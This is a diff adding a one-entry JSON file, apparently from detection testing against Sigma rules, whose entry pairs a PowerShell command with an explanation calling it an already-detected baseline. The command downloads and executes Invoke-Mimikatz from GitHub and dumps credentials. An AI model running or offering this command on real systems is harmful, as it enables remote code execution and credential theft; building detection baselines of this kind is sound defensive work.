@@ -1,0 +1,6 @@
+[
+  {
+    "output": "powershell.exe -Command \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+    "explanation": "This command uses a direct PowerShell invocation of the Invoke-Mimikatz script with the -DumpCreds option, which is already detected by the Sigma rule. It is provided as a baseline for comparison."
+  }
+]
